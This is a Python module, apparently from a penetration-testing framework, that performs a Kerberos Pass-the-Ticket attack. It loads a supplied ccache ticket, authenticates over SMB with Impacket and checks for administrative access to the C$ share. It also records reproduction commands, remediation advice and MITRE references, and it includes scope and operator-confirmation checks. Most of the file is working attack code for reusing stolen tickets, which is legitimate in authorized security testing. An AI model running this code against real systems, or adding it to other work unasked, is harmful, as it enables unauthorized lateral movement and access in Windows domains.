"""Pass the Ticket module."""
from __future__ import annotations

import sys
import os
import time
from pathlib import Path

sys.path.insert(0, str(Path(__file__).parent.parent.parent.parent))

from common.base_module import BaseModule, ModuleResult
from common.finding import Severity
from common.evidence import Evidence

CVSS_PTT_V31 = "CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H"
CVSS_PTT_V40 = "CVSS:4.0/AV:N/AC:L/AT:N/PR:H/UI:N/VC:H/VI:H/VA:H/SC:H/SI:H/SA:H"

class PassTicket(BaseModule):
    """Pass-the-Ticket attack module using Impacket."""

    NAME = "pass_ticket"
    DESCRIPTION = "Execute Pass-the-Ticket authentication via Kerberos"
    PHASE = 8
    TAGS = ["attack", "ptt", "kerberos", "authentication"]

    async def run(self) -> ModuleResult:
        start = time.monotonic()
        target = self.config.target
        
        if not self.check_scope(target):
            return self._make_result(start, skipped=True, skip_reason="Target out of scope")

        ticket_path = self.config.extra.get("ccache_file")
        target_spn = self.config.extra.get("spn", f"cifs/{target}")
        
        if not ticket_path or not os.path.exists(ticket_path):
            self.log.error("Pass-the-Ticket requires a valid 'ccache_file' path in extra config")
            return self._make_result(start, skipped=True, skip_reason="Missing ccache file")

        confirmed = self.confirm_action(
            module=self.NAME, 
            action="Pass-the-Ticket", 
            target=target, 
            risk="Authentication with stolen Kerberos ticket"
        )
        if not confirmed:
            return self._make_result(start, skipped=True, skip_reason="operator declined")

        self.log.info("Attempting Pass-the-Ticket against %s using %s", target, ticket_path)

        try:
            from impacket.smbconnection import SMBConnection, SessionError
            import socket
            
            # Set the KRB5CCNAME environment variable so Impacket uses it
            old_ccname = os.environ.get('KRB5CCNAME')
            os.environ['KRB5CCNAME'] = ticket_path

            await self.rate_limit()
            
            try:
                # We authenticate using Kerberos
                smb = SMBConnection(target, target, sess_port=445, timeout=self.config.timeout)
                # Login using the ticket in KRB5CCNAME
                # For Kerberos we just pass empty strings and let impacket pick up the ticket
                smb.kerberosLogin("", "", "", "", "", "")
                
                is_admin = False
                try:
                    smb.listPath('C$', '\\*')
                    is_admin = True
                except SessionError:
                    pass
                
                smb.logoff()
                
                ev = Evidence(
                    request_raw=f"SMB Kerberos Login via Ticket: {ticket_path}\nTarget SPN: {target_spn}",
                    response_raw=f"Login Successful. Is Admin: {is_admin}",
                    extra={"ticket": ticket_path, "is_admin": is_admin}
                )
                
                self.new_finding(
                    title="Successful Pass-the-Ticket Authentication",
                    severity=Severity.CRITICAL if is_admin else Severity.HIGH,
                    description=(
                        f"Successfully authenticated to {target} via Kerberos Pass-the-Ticket. "
                        f"Administrative access to C$: {is_admin}. "
                        f"The injected ticket ({os.path.basename(ticket_path)}) is valid and grants access."
                    ),
                    reproduction_steps=[
                        f"export KRB5CCNAME={ticket_path}",
                        f"impacket-smbclient -k @{target}"
                    ],
                    remediation="Reduce ticket lifetimes, enforce Privileged Access Workstations (PAW), and enable Windows Defender Credential Guard to protect tickets in memory.",
                    references=["MITRE T1550.003", "https://www.crowdstrike.com/cybersecurity-101/pass-the-ticket/"],
                    evidence=ev,
                    cvss_v31_vector=CVSS_PTT_V31,
                    cvss_v40_vector=CVSS_PTT_V40,
                    target=target,
                    mitre_attack=["TA0008/T1550.003"]
                )
                
            except SessionError as e:
                self.log.info("PtT login failed: %s", e)
            except (socket.error, Exception) as e:
                self.log.error("SMB connection failed during PtT: %s", e)
            finally:
                # Restore environment
                if old_ccname:
                    os.environ['KRB5CCNAME'] = old_ccname
                else:
                    del os.environ['KRB5CCNAME']

        except ImportError:
            self.log.error("Impacket is required for Pass-the-Ticket module")
            return self._make_result(start, skipped=True, skip_reason="Impacket missing")

        return self._make_result(start)

class TestPassTicket:
    def test_phase(self):
        assert PassTicket.PHASE == 8
